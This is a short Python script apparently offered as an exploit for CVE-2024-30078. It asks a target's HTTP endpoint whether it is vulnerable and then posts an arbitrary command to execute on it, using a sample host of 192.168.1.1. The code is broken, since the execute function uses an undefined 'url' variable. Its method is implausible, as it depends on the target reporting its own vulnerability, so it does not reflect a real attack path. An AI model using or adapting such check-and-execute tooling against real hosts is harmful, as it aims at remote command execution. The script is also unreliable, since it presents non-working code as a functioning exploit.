import requests
import json

# Define the endpoint and command to be executed
ENDPOINT = "/check"  # Replace with the actual endpoint

def check_vulnerability_and_execute(ip, port, endpoint, command):
    url = f"http://{ip}:{port}{endpoint}"
    headers = {"Content-Type": "application/json"}
    payload = {"command": "check_vulnerability", "cve": "CVE-2024-30078"}

    try:
        # Check for vulnerability
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        response.raise_for_status()

        if "vulnerable" in response.json() and response.json()["vulnerable"]:
            print(f"Vulnerability detected on {ip}:{port}")
            execute_command(ip, port, endpoint, command, headers)
        else:
            print(f"No vulnerability detected on {ip}:{port}")
    except requests.RequestException as e:
        print(f"Failed to connect to {ip}:{port}, error: {str(e)}")

def execute_command(ip, port, endpoint, command, headers):
    payload_command = {"command": command}
    try:
        exec_response = requests.post(url, headers=headers, data=json.dumps(payload_command))
        exec_response.raise_for_status()
        print(f"Command executed on {ip}:{port}")
    except requests.RequestException as e:
        print(f"Failed to execute command on {ip}:{port}, error: {str(e)}")

# Example usage with parameters
ip = "192.168.1.1"
port = 80
command = "your_command_here"
check_vulnerability_and_execute(ip, port, ENDPOINT, command)
